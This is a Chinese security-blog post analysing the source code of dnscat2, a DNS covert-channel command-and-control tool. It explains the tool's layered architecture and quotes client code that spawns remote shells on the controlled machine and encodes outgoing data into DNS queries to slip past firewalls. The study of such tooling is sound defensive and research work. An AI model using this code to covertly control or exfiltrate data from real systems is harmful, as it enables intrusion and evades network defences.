# DNSCAT2 深入学习（一）

阅读量 **309063**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-08-08 16:35:54

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01410f11c91b118a7d.jpg)

最近在学习一款隐蔽信道通信工具，[dnscat2](https://github.com/iagox86/dnscat2/)，这是一个十分成熟的工具，我准备通过一系列文章，从架构出发，立足于源码，深入分析，既作为学习记录，也和大家进行交流，希望能对大家有所帮助。时间仓促，如有分析不当之处还请大家多多指出。

## 简介

dnscat2是基于DNS协议的通信工具，一般的通信工具基于TCP等的传输方式非常容易被防火墙拦截，但是dnscat2基于的DNS查询与响应报文一般不会被拦截，进而可以完成信息传输。

dnscat2分为client端和server端，client运行在被控机器上，server运行在DNS服务器上。client，server部分分别是用C，ruby写的。其中作者在实现client部分时实现了跨平台，支持linux和windows编译运行。在完成连接建立后可以实现建立shell，上传下载文件等功能，运行效果如下：

![](https://p4.ssl.qhimg.com/t01f7ccdced90162e9d.png)

![](https://p3.ssl.qhimg.com/t015daacd65b4c122a8.png)

## 架构分析

借用官方文档的一张图：

+—————+  
| tunnel_driver | (only 1)  
+—————+  
|  
(has one)  
|  
v  
+————+  
| controller | (only 1)  
+————+  
|  
(has one or more)  
|  
v  
+———+  
| session | (at least one)  
+———+  
|  
(has exactly one)  
|  
v  
+——–+  
| driver | (exactly one / session)  
+——–+

整个工具分为四层架构，从下到上分别是tunnel_driver，controller，session，和driver。收到数据后，数据经下层流到上层，上层处理完毕之后产生响应数据，再由上层经下层一步步封装后经udpsocket发送出去。

整个工具在运行过程中只包含一个tunneldriver和controller，他们负责接收和分发数据给各个session。可以有多个session和driver，分别处理不同的任务（shell，download,upload…）。

下面分析各个层次的具体功能。

在分析之前先列出接收和发送报文函数流，以免迷失方向。

![](https://p5.ssl.qhimg.com/t0114fefd9ce4c1356c.png)

## tunnel_driver

这个层次是通过udp接受和发送报文的,它几乎没有对报文做任何处理，只是将上层来的报文封装给udp发出去，接收外部来的响应报文。

创建udp_socket并且设置相关参数：

    
    
    driver->s = udp_create_socket(0, host);
    /* Set the domain and stuff. */
    driver->group      = group;
    driver->domain     = domain;
    driver->dns_port   = port;
    driver->dns_server = server;

dnscat2采用select库来实现异步socket操作,设置各种回调函数，其中比较重要的是recvsocketcallback，当接收到报文时就调用这个回调函数来处理报文：

    
    
    select_group_add_socket(group, driver->s, SOCKET_TYPE_STREAM, driver);
    select_set_recv(group, driver->s, recv_socket_callback);
    select_set_timeout(group, timeout_callback, driver);
    select_set_closed(group, driver->s, dns_data_closed);

在recvsocketcallback中根据不同种类的dns报文进行不同的处理。具体的处理过程和dns协议有关，有关dnscat2如何利用dns协议进行数据封装的介绍留在之后介绍。

    
    
        if(type == _DNS_TYPE_TEXT)
        {
          LOG_INFO("Received a TXT response: %s", dns->answers[0].answer->TEXT.text);
    
          /* Get the answer. */
          tmp_answer    = dns->answers[0].answer->TEXT.text;
          answer_length = dns->answers[0].answer->TEXT.length;
    
          /* Decode it. */
          answer = buffer_decode_hex(tmp_answer, &answer_length);
        }
        else if(type == _DNS_TYPE_CNAME)
        {
          LOG_INFO("Received a CNAME response: %s", (char*)dns->answers[0].answer->CNAME.name);
    
          /* Get the answer. */
          tmp_answer = remove_domain((char*)dns->answers[0].answer->CNAME.name, driver->domain);
          if(!tmp_answer)
          {
            answer = NULL;
          }
          else
          {
            answer_length = strlen((char*)tmp_answer);
    
            /* Decode it. */
            answer = buffer_decode_hex(tmp_answer, &answer_length);
            safe_free(tmp_answer);
          }
        }
        .......
        else
        {
          LOG_ERROR("Unknown DNS type returned: %d", type);
          answer = NULL;
        }

###  controller

session作为tunneldriver和session的中间层次所做的工作就是根据tunneldriver传来的报文id来识别和报文相对应的session并且将它发送给session:

    
    
    NBBOOL controller_data_incoming(uint8_t *data, size_t length)
    {
      uint16_t session_id = packet_peek_session_id(data, length);
      session_t *session = sessions_get_by_id(session_id);
    
      /* If we weren't able to find a session, print an error and return. */
      if(!session)
      {
        LOG_ERROR("Tried to access a non-existent session (%s): %d", __FUNCTION__, session_id);
        return FALSE;
      }
    
      /* Pass the data onto the session. */
      return session_data_incoming(session, data, length);
    }

### session

session层次可以说时整个工具里最重要的层次，dnscat2协议就在这个层次里体现（关于dnscat2
protocol的介绍在后面进行），在session里有一个有限状态机，类似于tcp的协议过程对报文的内容进行识别与认定，以及解密响应等操作。

在进行具体的操作之前先向各个driver询问是否有数据输出，因为马上就要有新的报文需要处理响应了。

    
    
    packet_t *packet;
    
      /* Set to TRUE if data was properly ACKed and we should send more right away. */
      NBBOOL send_right_away = FALSE;
    
      /* Suck in any data we can from the driver. */
      poll_driver_for_data(session);

然后就是设置有限状态机的各种处理函数，从各种处理函数中我们能看出有限状态机的脉络（这一部分在protocol里介绍）：

    
    
    #ifndef NO_ENCRYPTION
        handlers[PACKET_TYPE_SYN][SESSION_STATE_BEFORE_INIT]    = _handle_error;
        handlers[PACKET_TYPE_SYN][SESSION_STATE_BEFORE_AUTH]    = _handle_error;
    #endif
        handlers[PACKET_TYPE_SYN][SESSION_STATE_NEW]            = _handle_syn_new;
        handlers[PACKET_TYPE_SYN][SESSION_STATE_ESTABLISHED]    = _handle_warning;
    
    #ifndef NO_ENCRYPTION
        handlers[PACKET_TYPE_MSG][SESSION_STATE_BEFORE_INIT]    = _handle_error;
        handlers[PACKET_TYPE_MSG][SESSION_STATE_BEFORE_AUTH]    = _handle_error;
    #endif
        handlers[PACKET_TYPE_MSG][SESSION_STATE_NEW]            = _handle_warning;
        handlers[PACKET_TYPE_MSG][SESSION_STATE_ESTABLISHED]    = _handle_msg_established;
    
    #ifndef NO_ENCRYPTION
        handlers[PACKET_TYPE_FIN][SESSION_STATE_BEFORE_INIT]    = _handle_fin;
        handlers[PACKET_TYPE_FIN][SESSION_STATE_BEFORE_AUTH]    = _handle_fin;
    #endif
        handlers[PACKET_TYPE_FIN][SESSION_STATE_NEW]            = _handle_fin;
        handlers[PACKET_TYPE_FIN][SESSION_STATE_ESTABLISHED]    = _handle_fin;
    
    #ifndef NO_ENCRYPTION
        handlers[PACKET_TYPE_ENC][SESSION_STATE_BEFORE_INIT]   = _handle_enc_before_init;
        handlers[PACKET_TYPE_ENC][SESSION_STATE_BEFORE_AUTH]   = _handle_enc_before_auth;
        handlers[PACKET_TYPE_ENC][SESSION_STATE_NEW]           = _handle_error;
        handlers[PACKET_TYPE_ENC][SESSION_STATE_ESTABLISHED]   = _handle_enc_renegotiate;

在session确认报文被全部接收后，最后会调用handlemsg_established回调函数来将数据发送给driver，进行进一步的处理（理解数据的内容，比如说是要建立一个shell？上传一个文件？等等）

    
    
      if(packet->body.msg.seq == session->their_seq)
      {
        /* Verify the ACK is sane */
        uint16_t bytes_acked = packet->body.msg.ack - session->my_seq;
    
        .....
          /* Increment their sequence number */
          session->their_seq = (session->their_seq + packet->body.msg.data_length) & 0xFFFF;
    
          /* Remove the acknowledged data from the buffer */
          buffer_consume(session->outgoing_buffer, bytes_acked);
    
          /* Increment my sequence number */
          if(bytes_acked != 0)
          {
            session->my_seq = (session->my_seq + bytes_acked) & 0xFFFF;
          }
    
          /* Print the data, if we received any, and then immediately receive more. */
          if(packet->body.msg.data_length > 0)
          {
            driver_data_received(session->driver, packet->body.msg.data, packet->body.msg.data_length);
            you_can_transmit_now(session);
          }
        }

###  driver

每一个session对应着一个driver，用来从更高层次上处理报文。在dnscat2中作者总共提供了4中driver，分别是driverconsole，driverexec，driverping和drivercommand，每种不同的driver都实现了一种不同的功能。

其中最简单的就是driver_console，它将收到的数据直接打印出来,实现一个类似交互的功能：

    
    
    void driver_console_data_received(driver_console_t *driver, uint8_t *data, size_t length)
    {
      size_t i;
    
      for(i = 0; i < length; i++)
        fputc(data[i], stdout);
    }

较为复杂的是driver_command，它实现的功能最多，例如建立shell，下载上传文件，作者针对不同的功能分别进行了处理：

    
    
        switch(in->command_id)
        {
          case COMMAND_PING:
            out = handle_ping(driver, in);
            break;
    
          case COMMAND_SHELL:
            out = handle_shell(driver, in);
            break;
    
          case COMMAND_EXEC:
            out = handle_exec(driver, in);
            break;
    
          case COMMAND_DOWNLOAD:
            out = handle_download(driver, in);
            break;
    
          case COMMAND_UPLOAD:
            out = handle_upload(driver, in);
            break;
    
          case COMMAND_SHUTDOWN:
            out = handle_shutdown(driver, in);
            break;
    
          case COMMAND_DELAY:
            out = handle_delay(driver, in);
            break;
    
          case TUNNEL_CONNECT:
            out = handle_tunnel_connect(driver, in);
            break;
    
          case TUNNEL_DATA:
            out = handle_tunnel_data(driver, in);
            break;
    
          case TUNNEL_CLOSE:
            out = handle_tunnel_close(driver, in);
            break;
    
          case COMMAND_ERROR:
            out = handle_error(driver, in);
            break;
    
          default:
            LOG_ERROR("Got a command packet that we don't know how to handle!\n");
            out = command_packet_create_error_response(in->request_id, 0xFFFF, "Not implemented yet!");
        }

具体看一下handle_shell(driver,
in),就是在被控制的机器上执行cmd.exe/win,sh/linux建立shell，然后将输入输出绑定进行实时传送：

    
    
    static command_packet_t *handle_shell(driver_command_t *driver, command_packet_t *in)
    {
      session_t *session = NULL;
    
      if(!in->is_request)
        return NULL;
    
    #ifdef WIN32
      session = session_create_exec(driver->group, "cmd.exe", "cmd.exe");
    #else
      session = session_create_exec(driver->group, "sh", "sh");
    #endif
      controller_add_session(session);
    
      return command_packet_create_shell_response(in->request_id, session->id);
    }

###  发送数据

发送数据是接收数据的反过程，大致和接收类似，这里简单介绍一下。
前面介绍过要发送的数据产生在session将接收到的数据发送给driver之前，具体实现在polldriverfordata函数中,其中调用了drivergetoutgoing来向driver“索要数据”，然后将数据封装在outgoingbuffer中等待发送：

    
    
    static void poll_driver_for_data(session_t *session)
    {
      size_t length = -1;
    
      /* Read all the data we can. */
      uint8_t *data = driver_get_outgoing(session->driver, &length, -1);
    
      /* If a driver returns NULL, it means it's done - once the driver is
       * done and all our data is sent, go into 'shutdown' mode. */
      if(!data)
      {
        if(buffer_get_remaining_bytes(session->outgoing_buffer) == 0)
          session_kill(session);
      }
      else
      {
        if(length)
          buffer_add_bytes(session->outgoing_buffer, data, length);
    
        safe_free(data);
      }
    }

在drivergetoutgoing中根据不同的driver类型来产生数据。

    
    
    uint8_t *driver_get_outgoing(driver_t *driver, size_t *length, size_t max_length)
    {
      switch(driver->type)
      {
        case DRIVER_TYPE_CONSOLE:
          return driver_console_get_outgoing(driver->real_driver.console, length, max_length);
          break;
    
        case DRIVER_TYPE_EXEC:
          return driver_exec_get_outgoing(driver->real_driver.exec, length, max_length);
          break;
    
        case DRIVER_TYPE_COMMAND:
          return driver_command_get_outgoing(driver->real_driver.command, length, max_length);
          break;
    
        case DRIVER_TYPE_PING:
          return driver_ping_get_outgoing(driver->real_driver.ping, length, max_length);
          break;
    
        default:
          LOG_FATAL("UNKNOWN DRIVER TYPE! (%d in driver_get_outgoing)\n", driver->type);
          exit(1);
          break;
      }
    }

就driverconsolegetoutgoing来说，在创建driverconsole的时候就将stdin加入到了select当中进行接收标准输入作为发送数据：

    
    
    select_group_add_pipe(group, -1, stdin_handle, driver);
    select_set_recv(group,       -1, console_stdin_recv);
    select_set_closed(group,     -1, console_stdin_closed);
    
    
    static SELECT_RESPONSE_t console_stdin_recv(void *group, int socket, uint8_t *data, size_t length, char *addr, uint16_t port, void *d)
    {
      driver_console_t *driver = (driver_console_t*) d;
    
      buffer_add_bytes(driver->outgoing_data, data, length);
    
      return SELECT_OK;
    }

在之后经历sessiongetoutgoing，controllergetoutgoing，do_send后将数据发送出去。

    
    
    static void do_send(driver_dns_t *driver)
    {
      size_t        i;
      dns_t        *dns;
      buffer_t     *buffer;
      uint8_t      *encoded_bytes;
      size_t        encoded_length;
      uint8_t      *dns_bytes;
      size_t        dns_length;
      size_t        section_length;
    
      size_t length;
      uint8_t *data = controller_get_outgoing((size_t*)&length, (size_t)MAX_DNSCAT_LENGTH(driver->domain));
    
      /* If we aren't supposed to send anything (like we're waiting for a timeout),
       * data is NULL. */
      if(!data)
        return;
    
      assert(driver->s != -1); /* Make sure we have a valid socket. */
      assert(data); /* Make sure they aren't trying to send NULL. */
      assert(length > 0); /* Make sure they aren't trying to send 0 bytes. */
      assert(length <= MAX_DNSCAT_LENGTH(driver->domain));
    
      buffer = buffer_create(BO_BIG_ENDIAN);
    
      /* If no domain is set, add the wildcard prefix at the start. */
      if(!driver->domain)
      {
        buffer_add_bytes(buffer, (uint8_t*)WILDCARD_PREFIX, strlen(WILDCARD_PREFIX));
        buffer_add_int8(buffer, '.');
      }
    
      /* Keep track of the length of the current section (the characters between two periods). */
      section_length = 0;
      for(i = 0; i < length; i++)
      {
        buffer_add_int8(buffer, HEXCHAR((data[i] >> 4) & 0x0F));
        buffer_add_int8(buffer, HEXCHAR((data[i] >> 0) & 0x0F));
    
        /* Add periods when we need them. */
        section_length += 2;
        if(i + 1 != length && section_length + 2 >= MAX_FIELD_LENGTH)
        {
          section_length = 0;
          buffer_add_int8(buffer, '.');
        }
      }
    
      /* If a domain is set, instead of the wildcard prefix, add the domain to the end. */
      if(driver->domain)
      {
        buffer_add_int8(buffer, '.');
        buffer_add_bytes(buffer, driver->domain, strlen(driver->domain));
      }
      buffer_add_int8(buffer, '\0');
    
      /* Get the result out. */
      encoded_bytes = buffer_create_string_and_destroy(buffer, &encoded_length);
    
      /* Double-check we didn't mess up the length. */
      assert(encoded_length <= MAX_DNS_LENGTH);
    
      dns = dns_create(_DNS_OPCODE_QUERY, _DNS_FLAG_RD, _DNS_RCODE_SUCCESS);
      dns_add_question(dns, (char*)encoded_bytes, get_type(driver), _DNS_CLASS_IN);
      dns_bytes = dns_to_packet(dns, &dns_length);
    
      LOG_INFO("Sending DNS query for: %s to %s:%d", encoded_bytes, driver->dns_server, driver->dns_port);
      udp_send(driver->s, driver->dns_server, driver->dns_port, dns_bytes, dns_length);
    
      safe_free(dns_bytes);
      safe_free(encoded_bytes);
      safe_free(data);
    
      dns_destroy(dns);
    }

## 总结

这篇文章着重分析了dnscat2中的报文走向，以及大致的处理过程，在之后的文章中会对其中更细节的方面进行介绍。 欢迎大家评论交流！

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **now4yreal** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/183761](/post/id/183761)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [dnscat](/tag/dnscat)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhimg.com/t01cd13bd088f6fdd19.png) now4yreal

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

